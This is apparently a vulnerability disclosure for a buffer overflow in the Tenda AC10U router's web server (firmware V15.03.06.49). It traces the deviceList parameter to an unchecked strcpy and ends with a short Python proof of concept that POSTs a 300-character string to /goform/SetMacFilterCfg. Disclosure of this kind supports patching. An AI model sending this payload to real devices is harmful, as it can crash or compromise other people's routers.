# buffer overflow

## Tenda_AC10U_V1

version: V15.03.06.49

## Description:

There is a buffer overflow in httpd/formSetMacFilterCfg

## Source:

you may download it from : https://www.tendacn.com/download/detail-3795.html

## Analyse:


![](4.png)

get value from macFilterType , and get into if

![](5.png)

get value from deviceList , pass to set_macfilter_rules

![](6.png)

pass to set_macfilter_rules_by_one

![](7.png)

pass to parse_macfilter_rule

![](8.png)

finally call strcpy ,cause buff overflow

## POC
```
url = "http://192.168.1.13/goform/SetMacFilterCfg"
payload = 'A'*300 + '\n'

r = requests.post(url, data={'deviceList': payload , 'macFilterType': 1 })
```
